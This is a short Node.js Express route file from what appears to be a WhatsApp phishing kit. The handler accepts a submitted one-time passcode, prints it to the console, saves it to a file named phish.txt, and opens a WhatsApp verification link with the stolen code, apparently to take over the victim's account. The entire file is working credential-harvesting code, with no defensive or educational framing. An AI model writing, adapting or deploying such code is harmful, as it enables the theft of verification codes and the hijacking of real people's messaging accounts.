var express = require("express")
var app = express.Router()
var open = require("open")
var chalk = require("chalk")
var filename = "./phish.txt"
var fs = require("fs")
app.post("/", (req, res) => {
        res.redirect("/")
        console.log(chalk.cyan.bold(`\nOTP: ${req.body.otp}\n`))
        fs.writeFileSync(filename, `OTP: ${req.body.otp}`)
        console.log(chalk.green.bold(`\nwritten in ${filename}\n`))
        open(`https://v.whatsapp.com/${req.body.otp}`)
})
module.exports = app
